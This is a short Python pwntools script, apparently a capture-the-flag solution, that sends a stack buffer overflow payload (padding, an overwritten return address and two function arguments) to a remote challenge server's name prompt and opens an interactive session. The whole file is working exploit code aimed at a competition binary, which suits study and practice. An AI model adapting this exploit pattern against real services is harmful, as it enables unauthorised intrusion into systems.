#! /usr/bin/env python

from pwn import *

r = remote('ctf.umbccd.io', 4000) #connection to remote server

#r=process('./bof')


bof = "\x90"*62 #junk
aud = p32(0x8049182) #address we want to return to
bof1 = "A"*4 #extra junk to overwrite second return address
arg1 = p32(0x4b0) #value for first argmuent, time
arg2 = p32(0x16e) #value for second argument, room_num
#print(buf)

payload = bof+aud+bof1+arg1+arg2

r.sendlineafter("your name?",payload)
r.interactive()

